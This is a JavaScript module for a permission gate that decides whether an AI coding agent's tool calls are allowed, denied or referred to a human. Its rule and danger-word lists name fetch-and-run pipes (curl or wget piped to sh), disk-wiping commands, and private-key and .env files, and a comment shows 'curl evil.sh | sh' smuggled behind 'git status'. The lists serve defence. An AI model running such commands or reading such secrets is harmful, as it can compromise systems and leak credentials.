import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { parseJsonc } from './jsonc.js';

// Rule actions:
//   allow    approve without showing the dialog
//   deny     refuse; Claude is told the reason and tries something else
//   ask      no opinion; Claude Code shows the normal dialog to the human
//   decider  refer to an LLM/script (deciders.<name>.command), which replies
//            ALLOW / DENY: <reason> / ASK
export const ACTIONS = new Set(['allow', 'deny', 'ask', 'decider']);

// How strict each action is. When a shell line runs several commands, the
// strictest verdict among them wins.
const STRICTNESS = { allow: 0, decider: 1, ask: 2, deny: 3 };

// What a rule's `match` is tested against:
//   target  the Bash command, the Edit file path, ...  (default)
//   action  the whole tool_input minus payload fields  (see PAYLOAD_KEYS)
//   input   the whole tool_input, payload included
export const SCOPES = ['target', 'action', 'input'];

// Modes:
//   policy       rules decide (default)
//   approve-all  approve everything except explicit `deny` rules. Same
//                contract as Claude Code's bypassPermissions (deny rules
//                still apply), but switchable without restarting:
//                CCAUTO_MODE=approve-all in the environment, or
//                `ccauto mode approve-all` (stored in <CCAUTO_HOME>/state.json,
//                optionally time-limited: `ccauto mode approve-all --for 30m`)
//   approve-except-deletes
//                approve everything, but stop and ask before anything that
//                removes files. `deny` and `ask` rules both apply (that is
//                the difference from approve-all, which ignores `ask`), so
//                the built-in `deletes` and `secrets` rules still stop you.
//                `allow` rules are honoured in the sense that they win when
//                they come first: a rule of your own that allows a specific
//                deletion keeps it silent.
export const MODES = ['policy', 'approve-all', 'approve-except-deletes'];

// Tools whose input is a shell line, and therefore possibly several commands.
// They do not all speak the same shell, so each names its dialect.
export const SHELL_TOOLS = new Map([
  ['Bash', 'bash'],
  ['PowerShell', 'powershell'],
]);

// Per dialect: the escape character, and the syntax that runs a command
// which never appears as a command of its own.
//   bash        \ escapes; $( ) ` ` <( ) >( ) all run something
//   powershell  ` escapes (a backslash is an ordinary character, so `\;`
//               really does separate two statements); $( ) @( ) &( ) run
const FLAVORS = {
  bash: { escape: '\\', substitution: /\$\(|`|<\(|>\(/ },
  powershell: { escape: '`', substitution: /\$\(|@\(|&\(/ },
};

export function shellFlavor(toolName) {
  return SHELL_TOOLS.get(toolName) ?? 'bash';
}

// Fields that carry file contents or prose rather than an action. Scanning
// them for danger words made every edit that merely mentions "delete"
// escalate to a dialog, which only teaches you to click through it.
//
// They are stripped only for the tools below, whose payload really is inert
// content. For anything else -- an MCP tool, say -- a field called `text` or
// `body` may well be the action itself (`{"text": "DROP TABLE users"}`), so
// nothing is stripped and the whole input is scanned.
export const PAYLOAD_KEYS = new Set([
  'content',
  'new_string',
  'old_string',
  'new_str',
  'old_str',
  'new_source',
  'old_source',
  'replacement',
  'body',
  'text',
]);

export const PAYLOAD_TOOLS = new Set(['Edit', 'Write', 'MultiEdit', 'NotebookEdit']);

// Commands that remove things. Deleting is the one operation you usually
// cannot undo from the transcript, so it gets its own list rather than
// living among the danger words: `approve-except-deletes` is built on it.
// Replaced wholesale by `deletionWords` in the config when present.
export const DEFAULT_DELETION_WORDS = [
  '\\brm\\b', '\\brmdir\\b', '\\bunlink\\b', '\\bshred\\b', '\\brimraf\\b', '\\btrash\\b',
  '\\bdel\\b', '\\berase\\b', '\\brd\\s+\\/s', 'Remove-Item', 'Clear-Content',
  'find\\b[^|;&]*-delete', 'find\\b[^|;&]*-exec\\s+rm',
  'git\\s+(rm|clean)\\b', '\\btruncate\\b',
];

// Tools whose name says they remove something. Matched as a tool glob, so
// an MCP server's delete_file / removeObject is caught without knowing its
// argument shape.
export const DELETE_TOOL_GLOB = '*delete*|*Delete*|*remove*|*Remove*|*unlink*|*trash*';

// Conservative built-ins: read-only git, directory listing, test/build
// runners. Secrets and deletions are always a human decision. Order
// matters: first matching rule wins, so those two come first.
export const DEFAULT_RULES = [
  {
    name: 'secrets',
    tool: '*',
    match: '(\\.env(\\.|\\b)|id_rsa|id_ed25519|\\.pem\\b|\\.p12\\b|credentials|secrets?\\.(json|ya?ml|toml))',
    flags: 'i',
    scope: 'action',
    action: 'ask',
  },
  {
    name: 'deletes',
    tool: 'Bash|PowerShell',
    match: DEFAULT_DELETION_WORDS.join('|'),
    flags: 'i',
    action: 'ask',
  },
  {
    name: 'delete-tools',
    tool: DELETE_TOOL_GLOB,
    action: 'ask',
  },
  {
    // Read-only git only. The subcommand alone is not enough: `git branch`
    // lists but `git branch -D` deletes, and `git diff --output=F` writes a
    // file, so writing flags disqualify the whole command.
    name: 'git-readonly',
    tool: 'Bash',
    match:
      '^git (status|diff|log|show|remote -v|stash list|blame|branch)\\b(?!.*(?:--output|--delete|--force|--set-upstream|--edit|\\s-[A-Za-z]*[DdMmfu](?:\\s|$)))',
    action: 'allow',
  },
  {
    name: 'list-and-inspect',
    tool: 'Bash',
    match: '^(ls|dir|pwd|tree|which|where)\\b',
    action: 'allow',
  },
  {
    // Test and build runners, but only against the project itself. A path
    // argument that is absolute, home-relative or climbing out of the tree
    // turns a runner into "execute this file" (`node --test /tmp/x.js`), and
    // --fix/--write turn a checker into an editor.
    name: 'test-and-build',
    tool: 'Bash',
    match:
      '^(?!.*\\s(?:[~/]|[A-Za-z]:[\\\\/]|\\.\\.[\\\\/]))(?!.*\\s--(?:fix|write)\\b)(npm (test|run (test|lint|build|check|typecheck))|npx (vitest|jest|eslint|tsc|prettier --check)|yarn (test|lint|build)|pnpm (test|lint|build)|cargo (check|test|build|clippy|fmt)|pytest|python -m pytest|go (test|vet|build)|node --test)\\b',
    action: 'allow',
  },
];

// Matched (case-insensitive) against the danger subject. A hit turns an
// `allow` into `onDanger` (default: ask the human).
export const DEFAULT_DANGER_WORDS = [
  'rm -r', 'rm -f', 'rmdir', 'del /', 'Remove-Item', 'rd /s',
  '\\bforce\\b', 'git push', 'reset --hard', 'checkout --', 'clean -fd',
  '\\bdelete\\b', '\\bdrop\\b', '\\btruncate\\b', '\\bsudo\\b', 'chmod 777', '\\bchown\\b',
  'curl[^|\\n]*\\|\\s*(ba|z)?sh', 'wget[^|\\n]*\\|\\s*(ba|z)?sh',
  '\\bformat\\b', 'mkfs', 'dd if=', '> /dev/', 'shutdown', 'reboot',
  'irreversible', 'cannot be undone', '\\bpermanently\\b',
];

// The built-ins with the `deletes` rule rebuilt from whatever deletion
// words are in force, so `deletionWords` in the config really does change
// what `approve-except-deletes` stops on.
export function defaultRules(deletionWords = DEFAULT_DELETION_WORDS) {
  return DEFAULT_RULES.map((r) => (r.name === 'deletes' ? { ...r, match: deletionWords.join('|') } : r));
}

const DEFAULTS = {
  mode: 'policy',
  dangerWords: DEFAULT_DANGER_WORDS,
  deletionWords: DEFAULT_DELETION_WORDS,
  dangerScope: 'action', // action (payload fields ignored) | input (everything)
  onDanger: 'ask', // ask | decider
  onUnmatched: 'ask', // ask | decider
  deciders: {}, // { default: { command: "claude -p --model haiku" } }
  deciderTimeoutSec: 45,
  // file null -> <CCAUTO_HOME>/log.jsonl; maxBytes 0 disables rotation
  log: { enabled: true, file: null, maxBytes: 5 * 1024 * 1024 },
};

export function ccautoHome() {
  return process.env.CCAUTO_HOME || path.join(os.homedir(), '.ccauto');
}

export function userConfigPath() {
  return path.join(ccautoHome(), 'config.json');
}

export function projectConfigPath(cwd) {
  return path.join(cwd, '.ccauto', 'config.json');
}

// Runtime overrides that should not live in the (hand-edited, JSONC) config.
export function statePath() {
  return path.join(ccautoHome(), 'state.json');
}

export function readState() {
  const file = statePath();
  if (!fs.existsSync(file)) return {};
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch {
    return {};
  }
}

export function writeState(patch) {
  const file = statePath();
  const next = { ...readState(), ...patch };
  for (const k of Object.keys(next)) if (next[k] === undefined || next[k] === null) delete next[k];
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify(next, null, 2) + '\n');
  return next;
}

// "30m", "2h", "90s", "1h30m" -> milliseconds. Null if it is not a duration.
export function parseDuration(spec) {
  const text = String(spec ?? '').trim();
  if (!text || !/^(\d+(?:\.\d+)?[smhd])+$/i.test(text)) return null;
  const unit = { s: 1e3, m: 6e4, h: 36e5, d: 864e5 };
  let ms = 0;
  for (const [, n, u] of text.matchAll(/(\d+(?:\.\d+)?)([smhd])/gi)) ms += Number(n) * unit[u.toLowerCase()];
  return ms > 0 ? ms : null;
}

export function formatRemaining(ms) {
  if (!(ms > 0)) return 'expired';
  const s = Math.round(ms / 1000);
  if (s < 60) return `${s}s`;
  const m = Math.round(s / 60);
  if (m < 60) return `${m}m`;
  const h = Math.floor(m / 60);
  return `${h}h${m % 60 ? `${m % 60}m` : ''}`;
}

// The stored mode override, unless it has expired. `ccauto mode` clears an
// expired one from state.json when it next runs.
//
// A deadline that cannot be read is treated as already past, never as "no
// deadline": a corrupted or hand-edited state.json must not silently turn a
// 30-minute approve-all into a permanent one.
export function storedMode(state = readState(), now = Date.now()) {
  if (!state.mode) return null;
  const raw = state.modeExpiresAt;
  if (raw === undefined || raw === null) return state.mode; // no deadline: until reset
  if (typeof raw !== 'string') return null;
  const until = Date.parse(raw);
  if (Number.isNaN(until)) return null;
  return until > now ? state.mode : null;
}

function readConfig(file) {
  if (!fs.existsSync(file)) return null;
  try {
    return parseJsonc(fs.readFileSync(file, 'utf8'));
  } catch (e) {
    throw new Error(`invalid config ${file}: ${e.message}`);
  }
}

// "Bash" | "Edit|Write" | "mcp__browser-devtools__*" | "*"  ->  anchored regex
export function toolRegex(spec = '*') {
  const alts = String(spec)
    .split('|')
    .map((s) => s.trim())
    .filter(Boolean)
    .map((s) =>
      s
        .split('*')
        .map((p) => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
        .join('.*'),
    );
  return new RegExp(`^(?:${alts.join('|')})$`);
}

function compileRule(rule) {
  const label = rule.name ?? rule.match ?? '(unnamed)';
  if (!ACTIONS.has(rule.action)) {
    throw new Error(`rule "${label}": action must be one of ${[...ACTIONS].join('|')}`);
  }
  if (rule.scope != null && !SCOPES.includes(rule.scope)) {
    throw new Error(`rule "${label}": scope must be one of ${SCOPES.join('|')}`);
  }
  if (rule.field != null) {
    if (typeof rule.field !== 'string' || !rule.field.trim()) {
      throw new Error(`rule "${label}": field must be a non-empty string, e.g. "sql" or "params.query"`);
    }
    if (rule.scope != null) {
      throw new Error(`rule "${label}": use either field or scope, not both (field names one input field; scope picks a whole subject)`);
    }
  }
  let re = null;
  if (rule.match != null) {
    try {
      re = new RegExp(rule.match, rule.flags ?? '');
    } catch (e) {
      throw new Error(`rule "${label}": ${e.message}`);
    }
  }
  return { ...rule, toolRe: toolRegex(rule.tool), re };
}

function oneOf(value, allowed, key) {
  if (!allowed.includes(value)) {
    throw new Error(`${key} must be one of ${allowed.join('|')}`);
  }
  return value;
}

// Layering: defaults < ~/.ccauto/config.json < <cwd>/.ccauto/config.json.
// Rules: project first, then user, then defaults; first match wins. A rule
// with the same name as a later layer's rule shadows it; `disabled: true`
// tombstones a built-in.
export function loadPolicy(cwd = process.cwd()) {
  const userPath = userConfigPath();
  const projectPath = projectConfigPath(cwd);
  const user = readConfig(userPath);
  const project = readConfig(projectPath);

  const deletionWords = project?.deletionWords ?? user?.deletionWords ?? DEFAULTS.deletionWords;
  const layers = [
    [project, 'project'],
    [user, 'user'],
    [{ rules: defaultRules(deletionWords) }, 'default'],
  ];
  const seen = new Set();
  const rules = [];
  for (const [cfg, source] of layers) {
    for (const r of cfg?.rules ?? []) {
      const key = r.name ?? `${r.tool ?? '*'}:${r.match ?? ''}`;
      if (seen.has(key)) continue;
      seen.add(key);
      rules.push({ ...r, source });
    }
  }

  const pick = (key) => project?.[key] ?? user?.[key] ?? DEFAULTS[key];

  // Mode precedence: environment > stored override > project > user > default.
  const state = readState();
  const [modeSource, rawMode] = [
    ['env CCAUTO_MODE', process.env.CCAUTO_MODE],
    [`override ${statePath()}`, storedMode(state)],
    ['project config', project?.mode],
    ['user config', user?.mode],
    ['default', DEFAULTS.mode],
  ].find(([, v]) => v != null && v !== '');
  const mode = oneOf(rawMode, MODES, `mode (${modeSource})`);
  const modeExpiresAt = modeSource.startsWith('override') ? (state.modeExpiresAt ?? null) : null;

  const dangerWords = pick('dangerWords');
  const dangerScope = oneOf(pick('dangerScope'), ['action', 'input'], 'dangerScope');
  const onDanger = oneOf(pick('onDanger'), ['ask', 'decider'], 'onDanger');
  const onUnmatched = oneOf(pick('onUnmatched'), ['ask', 'decider'], 'onUnmatched');
  const deciders = { ...(user?.deciders ?? {}), ...(project?.deciders ?? {}) };
  const log = { ...DEFAULTS.log, ...(user?.log ?? {}), ...(project?.log ?? {}) };
  const deciderTimeoutSec = Number(pick('deciderTimeoutSec')) || DEFAULTS.deciderTimeoutSec;

  const compiled = rules.filter((r) => r.disabled !== true).map(compileRule);
  const dangerRe = dangerWords.length ? new RegExp(dangerWords.join('|'), 'i') : null;

  return {
    mode,
    modeSource,
    modeExpiresAt,
    rules,
    compiled,
    dangerWords,
    deletionWords,
    dangerScope,
    dangerRe,
    onDanger,
    onUnmatched,
    deciders,
    deciderTimeoutSec,
    log,
    sources: { user: !!user, project: !!project, userPath, projectPath },
  };
}

// The string a rule's `match` is tested against (scope "target", the default).
export function targetOf(toolName, input = {}) {
  switch (toolName) {
    case 'Bash':
    case 'PowerShell':
      return input.command ?? '';
    case 'Edit':
    case 'Write':
    case 'Read':
    case 'MultiEdit':
      return input.file_path ?? '';
    case 'NotebookEdit':
      return input.notebook_path ?? '';
    case 'Glob':
    case 'Grep':
      return input.pattern ?? '';
    case 'WebFetch':
      return input.url ?? '';
    case 'WebSearch':
      return input.query ?? '';
    default:
      return toolName;
  }
}

// tool_input for scope "action": payload fields are dropped, at any depth,
// but only for the tools whose payload is inert content (PAYLOAD_TOOLS).
// Every other tool is scanned whole, so an action cannot hide in a field
// that merely happens to be called `text`.
export function actionSubject(input, toolName) {
  if (!PAYLOAD_TOOLS.has(toolName)) return JSON.stringify(input ?? {});
  const strip = (v) => {
    if (Array.isArray(v)) return v.map(strip);
    if (v && typeof v === 'object') {
      const out = {};
      for (const [k, val] of Object.entries(v)) {
        if (PAYLOAD_KEYS.has(k)) continue;
        out[k] = strip(val);
      }
      return out;
    }
    return v;
  };
  return JSON.stringify(strip(input ?? {}));
}

// Split a shell line into the commands it actually runs. Quoting is
// respected, so `echo "a; b"` stays one command and `2>&1` is not mistaken
// for a background operator. The escape character depends on the dialect:
// a backslash escapes in bash but is an ordinary character in PowerShell.
export function splitShell(command, flavor = 'bash') {
  const { escape } = FLAVORS[flavor] ?? FLAVORS.bash;
  // A line continuation is removed outright, exactly as the shell removes
  // it. Replacing it with a space would let `$\<newline>(` hide a `$(`.
  const src = String(command ?? '').replace(new RegExp(`\\${escape}\\r?\\n`, 'g'), '');
  const out = [];
  let buf = '';
  let quote = null;
  for (let i = 0; i < src.length; i++) {
    const c = src[i];
    const next = src[i + 1];
    if (quote) {
      if (c === escape && quote === '"' && next != null) {
        buf += c + next;
        i++;
        continue;
      }
      if (c === quote) quote = null;
      buf += c;
      continue;
    }
    if (c === escape && next != null) {
      buf += c + next;
      i++;
      continue;
    }
    if (c === '"' || c === "'") {
      quote = c;
      buf += c;
      continue;
    }
    if (c === '\n' || c === '\r' || c === ';') {
      out.push(buf);
      buf = '';
      continue;
    }
    if ((c === '&' || c === '|') && next === c) {
      out.push(buf);
      buf = '';
      i++;
      continue;
    }
    if (c === '|' || (c === '&' && src[i - 1] !== '>')) {
      out.push(buf);
      buf = '';
      continue;
    }
    buf += c;
  }
  out.push(buf);
  return out.map((s) => s.trim()).filter(Boolean);
}

// Does this command run something that never appears as a command of its
// own, and so can never be judged? Conservative: such a segment is treated
// as unmatched.
export function hasSubstitution(text, flavor = 'bash') {
  return (FLAVORS[flavor] ?? FLAVORS.bash).substitution.test(String(text ?? ''));
}

// The commands one tool call would run. A single entry for anything that is
// not a shell line.
export function segmentsOf(toolName, input = {}) {
  const target = targetOf(toolName, input);
  if (!SHELL_TOOLS.has(toolName)) return [target];
  const parts = splitShell(target, shellFlavor(toolName));
  return parts.length ? parts : [target];
}

// Danger words never let an automated approval through: allow/decider become
// `onDanger`. An explicit ask/deny rule is left alone.
function applyDanger(action, danger, policy) {
  if (!danger || (action !== 'allow' && action !== 'decider')) {
    return { action, escalated: false };
  }
  const next = policy.onDanger;
  return { action: next, escalated: next !== action };
}

// One named field of tool_input, by dotted path: "sql", "params.query".
// Undefined when any step is missing, which is different from an empty
// string: a rule cannot match a field that is not there.
export function fieldValue(input, spec) {
  let cur = input;
  for (const key of String(spec).split('.')) {
    if (cur == null || typeof cur !== 'object') return undefined;
    cur = cur[key];
  }
  return cur;
}

// What this rule's `match` is tested against. `null` means "there is
// nothing to test", and the rule cannot match.
function subjectFor(rule, s) {
  if (rule.field != null) {
    const v = fieldValue(s.input, rule.field);
    if (v === undefined || v === null) return null;
    return typeof v === 'string' ? v : JSON.stringify(v);
  }
  if (rule.scope === 'input') return s.inputText;
  if (rule.scope === 'action') return s.actionText;
  return s.target;
}

function ruleMatches(rule, toolName, s) {
  if (!rule.toolRe.test(toolName)) return false;
  const subject = subjectFor(rule, s);
  if (subject === null) return false;
  return !rule.re || rule.re.test(subject);
}

function judgeSegment(policy, toolName, segment, ctx) {
  if (SHELL_TOOLS.has(toolName) && hasSubstitution(segment, shellFlavor(toolName))) {
    const { action, escalated } = applyDanger(policy.onUnmatched, ctx.danger, policy);
    return { action, rule: null, escalated, segment, note: 'command substitution' };
  }
  for (const rule of policy.compiled) {
    if (!ruleMatches(rule, toolName, { ...ctx, target: segment })) continue;
    const { action, escalated } = applyDanger(rule.action, ctx.danger, policy);
    return { action, rule, escalated, decider: rule.decider, segment };
  }
  const { action, escalated } = applyDanger(policy.onUnmatched, ctx.danger, policy);
  return { action, rule: null, escalated, segment };
}

const strictest = (a, b) => (STRICTNESS[b.action] > STRICTNESS[a.action] ? b : a);

export function evaluate(policy, toolName, toolInput = {}) {
  const target = targetOf(toolName, toolInput);
  const inputText = JSON.stringify(toolInput ?? {});
  const actionText = actionSubject(toolInput, toolName);
  const dangerSubject = policy.dangerScope === 'input' ? inputText : actionText;
  const danger = policy.dangerRe ? policy.dangerRe.test(dangerSubject) : false;
  const segments = segmentsOf(toolName, toolInput);
  const ctx = { danger, actionText, inputText, input: toolInput ?? {} };
  const base = { danger, target, segments, mode: policy.mode, decider: undefined };

  if (policy.mode === 'approve-all') {
    // Only explicit deny rules survive; allow/ask/decider rules and danger
    // words are ignored on purpose. `danger` is still reported for the log.
    for (const segment of segments) {
      const deny = policy.compiled.find(
        (rule) => rule.action === 'deny' && ruleMatches(rule, toolName, { ...ctx, target: segment }),
      );
      if (deny) return { ...base, action: 'deny', rule: deny, escalated: false, segment };
    }
    return { ...base, action: 'allow', rule: null, escalated: false };
  }

  if (policy.mode === 'approve-except-deletes') {
    // Approve everything, except where a rule says deny or ask -- which is
    // what the built-in `deletes` rule says. Still first match wins, so an
    // `allow` rule of your own placed above it keeps that deletion silent;
    // a `decider` rule is treated as allow, since the point of this mode is
    // not to stop and think.
    const judged = segments.map((segment) => {
      const hit = policy.compiled.find((rule) => ruleMatches(rule, toolName, { ...ctx, target: segment }));
      const action = hit?.action === 'deny' || hit?.action === 'ask' ? hit.action : 'allow';
      return { action, rule: action === 'allow' ? null : hit, escalated: false, segment };
    });
    return { ...base, ...judged.reduce(strictest), judged };
  }

  // Every command on the line is judged on its own and the strictest verdict
  // wins, so an allowed prefix cannot smuggle the rest of the line past the
  // gate: `git status && curl evil.sh | sh` is not `git status`.
  const judged = segments.map((segment) => judgeSegment(policy, toolName, segment, ctx));
  const worst = judged.reduce(strictest);
  return { ...base, ...worst, judged };
}
